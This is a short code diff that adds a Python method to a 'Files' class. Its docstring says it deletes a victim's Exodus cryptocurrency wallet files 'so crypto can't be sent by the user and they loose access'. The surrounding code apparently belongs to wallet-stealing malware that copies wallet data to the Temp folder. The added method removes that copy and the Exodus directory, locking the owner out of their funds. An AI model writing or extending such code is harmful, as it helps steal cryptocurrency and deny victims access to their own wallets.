@@ -31,3 +31,17 @@ class Files:
             return True
         except:
             return False
+        
+    def remove_files() -> bool:
+        """Remove the Exodus files so crypto can't be sent by the user and they loose access.
+
+        Returns:
+            bool: If we can remove the files from the system or not.
+        """
+        try:
+            os.remove(client + "\\AppData\\Local\\Temp\\Exodus.zip")
+            os.remove(client + "\\AppData\\Local\\Temp\\Exodus")
+            
+            return True
+        except:
+            return False
